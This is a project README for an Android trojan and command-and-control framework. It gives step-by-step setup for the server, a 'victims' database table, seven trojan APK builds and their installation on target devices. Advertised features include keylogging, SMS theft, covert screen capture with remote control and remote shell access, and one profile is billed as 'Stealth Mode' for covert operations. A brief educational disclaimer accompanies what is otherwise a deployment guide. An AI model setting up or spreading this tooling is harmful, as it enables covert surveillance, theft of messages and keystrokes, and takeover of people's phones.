# Android Trojan 2.0 - Advanced C2 Framework

<div align="center">

![Version](https://img.shields.io/badge/version-2.0-brightgreen)
![Platform](https://img.shields.io/badge/platform-Android-blue)
![Node](https://img.shields.io/badge/node-%3E%3D14.0.0-green)
![License](https://img.shields.io/badge/license-Educational-red)

**Professional Command & Control Framework for Android Devices**

[Features](#features) • [Installation](#installation) • [Usage](#usage) • [Screenshots](#screenshots) • [Disclaimer](#disclaimer)

</div>

---

## 🎯 Overview

Android Trojan 2.0 is a sophisticated Command & Control (C2) framework designed for security research and penetration testing. It features a modern web-based dashboard with real-time device monitoring, customizable APK generation, and multi-device management capabilities.

### ✨ What's New in v2.0

- 🎨 **Hack The Box Theme** - Professional cybersecurity aesthetic
- 📱 **Customizable APK Generation** - Feature-selective builds with minimal permissions
- 🔐 **Conditional Permissions** - Only request permissions for enabled features
- 🚀 **Simplified UI** - One-click APK generation with preset profiles
- 🔒 **Secure Authentication** - Session management with logout functionality
- 🎭 **New Logo** - Geometric cube design with neon green accents

---

## 🚀 Features

### Dashboard Features

- **Multi-Device Management** - Monitor and control multiple Android devices simultaneously
- **Real-Time Screen Sharing** - Live screen capture with remote mouse control
- **Keylogger** - Capture keyboard input and accessibility events
- **SMS Access** - Read and dump SMS messages
- **Shell Access** - Execute remote commands on target devices
- **Modern UI** - Dark theme with animated backgrounds and glassmorphism

### APK Generation

Generate custom trojans with **three preset profiles**:

#### 🔒 Stealth Mode
- **Features:** SMS Read only
- **Permissions:** READ_SMS, RECEIVE_SMS
- **Use Case:** Minimal footprint for covert operations

#### 📱 Remote Control
- **Features:** Screen Share + Keylogger
- **Permissions:** RECORD_AUDIO, BIND_ACCESSIBILITY_SERVICE
- **Use Case:** Full device control and monitoring

#### 🌐 Full Access
- **Features:** All features enabled
- **Permissions:** All permissions
- **Use Case:** Complete device access

### Technical Features

- **Socket.IO** - Real-time bidirectional communication
- **Product Flavors** - 7 different APK variants
- **Conditional Manifests** - Feature-specific permission requests
- **Foreground Service** - Reliable socket connection
- **Debug Signing** - Pre-signed APKs ready for installation

---

## 📋 Requirements

### Server
- Node.js >= 14.0.0
- npm >= 6.0.0

### Android Build
- Android Studio or Gradle
- JDK 8 or higher
- Android SDK (API 21+)

### Target Device
- Android 5.0 (Lollipop) or higher
- Internet connection

---

## 🛠️ Installation

### 1. Clone Repository

```bash
git clone https://github.com/Android-App-Security/Android-Trojan-2.0-Modified.git
cd Android-Trojan-2.0-Modified
```

### 2. Setup Supabase Database

This project uses Supabase for authentication and device tracking.

#### Create Supabase Account

1. Go to [Supabase](https://supabase.com/)
2. Create a new account (free tier is sufficient)
3. Create a new project

#### Get Supabase Credentials

1. In your Supabase project dashboard, go to **Settings** → **API**
2. Copy your **Project URL** (looks like: `https://xxxxx.supabase.co`)
3. Copy your **anon/public** API key

#### Create Database Tables

1. In Supabase, go to **SQL Editor**
2. Run the following SQL commands:

```sql
-- Victims Table (stores connected device information)
CREATE TABLE public.victims (
  "ID" character varying NOT NULL,
  "Country" character varying NULL,
  "ISP" character varying NULL,
  "IP" character varying NULL,
  "Brand" character varying NULL,
  "Model" character varying NULL,
  "Manufacture" character varying NULL,
  CONSTRAINT victims_pkey PRIMARY KEY ("ID")
) TABLESPACE pg_default;

-- Active User Table (stores login credentials)
CREATE TABLE public.activeuser (
  id BIGSERIAL PRIMARY KEY,
  username character varying NULL,
  password character varying NULL,
  name character varying NULL
) TABLESPACE pg_default;
```

#### Add Login Credentials

1. In Supabase, go to **Table Editor**
2. Select the `activeuser` table
3. Click **Insert** → **Insert row**
4. Add your credentials:
   - **username**: `admin` (or your preferred username)
   - **password**: `password123` (or your preferred password)
   - **name**: `Administrator` (or your name)
5. Click **Save**

> **Note:** Passwords are stored in plain text for simplicity. For production use, implement proper password hashing.

### 3. Configure Environment

Create a `.env` file in the project root:

```env
# Supabase Configuration
SUPERBASE_URL=https://your-project.supabase.co
SUPERBASE_KEY=your-anon-public-key-here

# Server Ports
PORT=4001
BOT_PORT=4000
```

Replace `your-project.supabase.co` and `your-anon-public-key-here` with your actual Supabase credentials.

### 4. Install Dependencies

```bash
npm install
```

### 5. Build APK Variants

You can either use pre-built APKs or build them yourself:

#### Option A: Build APKs (Recommended)

```bash
cd mobile
./gradlew assembleSmsRelease assembleKeyloggerRelease assembleScreenRelease assembleSmsKeyloggerRelease assembleSmsScreenRelease assembleKeyloggerScreenRelease assembleFullRelease
cd ..
./sign-apks.sh
```

This will create signed APKs in the `output/` directory.

#### Option B: Use Build Script

```bash
./build-all-apks.sh
./sign-apks.sh
```

> **Note:** Building APKs requires Android SDK and Gradle to be installed.

---

## 🎮 Usage

### Start the Server

```bash
npm start
```

The server will start on:
- **Bot Network:** `http://0.0.0.0:4000`
- **Master Network:** `http://0.0.0.0:4001`

### Access Dashboard

1. Navigate to `http://localhost:4001/login`
2. Login with your credentials (configured in Supabase)
3. Access the dashboard at `http://localhost:4001/dashboard`

### Generate Custom APK

1. Click **"Generate APK"** button in the dashboard
2. Enter server IP (or leave empty for auto-detection)
3. Select a build profile:
   - **Stealth Mode** - SMS only
   - **Remote Control** - Screen + Keylogger
   - **Full Access** - All features
4. APK will be generated and downloaded automatically

### Install on Target Device

```bash
adb install output/trojan_[profile]_v2.0.apk
```

Or transfer the APK to the device and install manually.

---

## 📱 APK Variants

| Variant | Features | Size | Permissions |
|---------|----------|------|-------------|
| `trojan_sms_v2.0.apk` | SMS + Shell | 5.0MB | READ_SMS, RECEIVE_SMS |
| `trojan_keylogger_v2.0.apk` | Keylogger + Shell | 5.0MB | BIND_ACCESSIBILITY_SERVICE |
| `trojan_screen_v2.0.apk` | Screen + Shell | 5.0MB | RECORD_AUDIO |
| `trojan_sms_keylogger_v2.0.apk` | SMS + Keylogger + Shell | 5.0MB | READ_SMS, BIND_ACCESSIBILITY |
| `trojan_sms_screen_v2.0.apk` | SMS + Screen + Shell | 5.0MB | READ_SMS, RECORD_AUDIO |
| `trojan_keylogger_screen_v2.0.apk` | Keylogger + Screen + Shell | 5.0MB | BIND_ACCESSIBILITY, RECORD_AUDIO |
| `trojan_full_v2.0.apk` | All Features | 5.0MB | All Permissions |

---

## 🎨 Screenshots

### Login Page
Modern authentication with Hack The Box theme

### Dashboard
Multi-device management with real-time monitoring

### APK Generator
One-click generation with preset profiles

### Screen Share
Live screen capture with remote control

---

## 🏗️ Architecture

### Backend (Node.js + Express)
- **Socket.IO** - Real-time communication
- **Express** - Web server and API
- **Session Management** - Secure authentication
- **APK Generation** - Serve pre-built variants

### Frontend (Vanilla JS)
- **Modern UI** - HTB-inspired design
- **Real-time Updates** - Socket.IO client
- **Responsive Design** - Works on all screen sizes
- **Material Icons** - Professional iconography

### Android App (Java)
- **MyService** - Foreground service with socket connection
- **Keylogger** - Accessibility service for input capture
- **Capture** - Screen recording and streaming
- **ShellExec** - Remote command execution
- **Product Flavors** - Feature-selective builds

---

## 🔧 Development

### Project Structure

```
Android-Trojan-2.0/
├── mobile/                 # Android app source
│   ├── app/
│   │   ├── src/
│   │   │   ├── main/      # Main source code
│   │   │   ├── sms/       # SMS variant manifest
│   │   │   ├── keylogger/ # Keylogger variant manifest
│   │   │   └── screen/    # Screen variant manifest
│   │   └── build.gradle   # Product flavors configuration
├── static/                # Web dashboard
│   ├── html/             # HTML pages
│   ├── css/              # Stylesheets
│   ├── js/               # JavaScript
│   └── img/              # Images and logo
├── output/               # Pre-built APKs
├── server.js             # Main server
├── build-all-apks.sh     # Build script
└── sign-apks.sh          # Signing script
```

### Build Profiles

The app uses Gradle product flavors to create feature-specific variants:

```gradle
productFlavors {
    sms {
        buildConfigField "boolean", "FEATURE_SMS", "true"
        buildConfigField "boolean", "FEATURE_KEYLOGGER", "false"
        buildConfigField "boolean", "FEATURE_SCREEN", "false"
        versionNameSuffix "-sms"
    }
    // ... other flavors
}
```

### Conditional Permissions

Flavor-specific manifests use `tools:node="remove"` to exclude unnecessary permissions:

```xml
<!-- sms/AndroidManifest.xml -->
<service
    android:name=".Keylogger"
    tools:node="remove" />
```

---

## 🔒 Security Considerations

### For Researchers
- Always obtain proper authorization before testing
- Use only in controlled environments
- Follow responsible disclosure practices
- Comply with local laws and regulations

### For Defenders
- Monitor for suspicious accessibility service requests
- Check for foreground services with network access
- Review app permissions carefully
- Use mobile security solutions

---

## 🐛 Troubleshooting

### APK Installation Failed
- Ensure debug keystore is properly configured
- Check Android version compatibility (API 21+)
- Enable "Install from Unknown Sources"

### Connection Issues
- Verify server IP is correct
- Check firewall settings
- Ensure both devices are on the same network
- Restart the server and reinstall APK

### Permission Denied
- Grant all requested permissions
- Enable Accessibility Service (for keylogger/screen variants)
- Allow screen recording (for screen variants)

---

## 📚 Documentation

- [Implementation Plan](/.gemini/antigravity/brain/23524d77-919d-43ce-b5ab-f49673bf4c27/implementation_plan.md)
- [Walkthrough](/.gemini/antigravity/brain/23524d77-919d-43ce-b5ab-f49673bf4c27/walkthrough.md)
- [Task Checklist](/.gemini/antigravity/brain/23524d77-919d-43ce-b5ab-f49673bf4c27/task.md)

---

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

---

## 📄 License

This project is for **educational and research purposes only**. The authors are not responsible for any misuse or damage caused by this program.

---

## ⚠️ Disclaimer

**IMPORTANT:** This tool is designed for security research, penetration testing, and educational purposes only. Unauthorized access to devices is illegal and unethical.

- ✅ **Legal Use:** Authorized penetration testing, security research, educational purposes
- ❌ **Illegal Use:** Unauthorized surveillance, data theft, malicious activities

By using this software, you agree to use it responsibly and in compliance with all applicable laws.

---

## 👨‍💻 Author

**Ko-kn3t**
- GitHub: [@Ko-kn3t](https://github.com/Ko-kn3t)

---

## 🙏 Acknowledgments

- Inspired by Hack The Box's cybersecurity aesthetic
- Built with Socket.IO for real-time communication
- Uses Material Icons for UI elements

---

<div align="center">

**Made with ❤️ for Security Research**

⭐ Star this repo if you find it useful!

</div>
